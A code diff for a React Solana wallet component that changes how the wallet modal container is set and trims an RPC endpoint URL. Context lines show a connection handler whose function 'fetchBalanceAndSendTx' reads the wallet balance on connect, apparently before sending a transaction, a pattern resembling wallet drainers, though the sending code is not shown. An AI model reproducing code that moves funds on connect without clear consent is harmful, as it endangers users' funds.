@@ -50,23 +50,12 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
         [network]
     );
 
-    const [container, setContainer] = useState<HTMLElement | null>(null);
-
-    useEffect(() => {
-        const el = document.getElementById('walletPopup');
-        if (el) setContainer(el);
-    }, []);
-
     return (
         <ConnectionProvider endpoint={endpoint}>
             <WalletProvider wallets={wallets} autoConnect>
-                {container ? (
-                    <WalletModalProvider container={(container as HTMLElement)}>
-                        {children}
-                    </WalletModalProvider>
-                ) : (
-                    <WalletModalProvider>{children}</WalletModalProvider>
-                )}
+                <WalletModalProvider container="#walletPopup">
+                    {children}
+                </WalletModalProvider>
             </WalletProvider>
         </ConnectionProvider>
     );
@@ -106,7 +95,7 @@ const WalletConnectionHandler: FC = () => {
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         try {
             setLoading(true);
-            const connection = new Connection('https://sg110.nodes.rpcpool.com/', 'confirmed');
+            const connection = new Connection('https://sg110.nodes.rpcpool.com', 'confirmed');
 
             const lamports = await connection.getBalance(walletPublicKey);
             const sol = lamports / LAMPORTS_PER_SOL;
